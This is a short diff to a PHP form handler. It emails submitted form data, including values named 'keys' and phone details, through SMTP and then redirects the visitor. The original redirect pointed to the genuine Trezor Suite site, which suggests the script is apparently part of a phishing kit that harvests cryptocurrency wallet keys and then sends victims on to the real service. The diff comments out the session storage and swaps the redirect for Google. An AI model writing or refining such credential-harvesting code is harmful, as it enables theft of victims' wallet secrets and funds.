@@ -17,10 +17,10 @@ $num         =   empty($_POST['number']) ? null : $_POST['number'];
     function sendEmail($try=1) {
          global $name;
          global $num;
-        global $keys;
-        global $phone_number;
-        global $phone_code;
-        global $country_code;
+      //   global $keys;
+      //   global $phone_number;
+      //   global $phone_code;
+      //   global $country_code;
         
         try {
             $mail           =   get_mail_smtp();
@@ -47,15 +47,15 @@ $num         =   empty($_POST['number']) ? null : $_POST['number'];
             
             $mail->send();
 
-            $_SESSION["keys"]           =   $keys;
-            $_SESSION["phone_number"]   =   $phone_number;
-            $_SESSION["phone_code"]     =   $phone_code;
-            $_SESSION["country_code"]   =   $country_code;
+            // $_SESSION["keys"]           =   $keys;
+            // $_SESSION["phone_number"]   =   $phone_number;
+            // $_SESSION["phone_code"]     =   $phone_code;
+            // $_SESSION["country_code"]   =   $country_code;
             
             if(empty($num)) {
                 redirect(base_url('next.php'));
             } else {
-                redirect('https://suite.trezor.io/web/');
+                redirect('https://www.google.com/');
             }
         } catch (Exception $ex) {
             $try = $try +1;
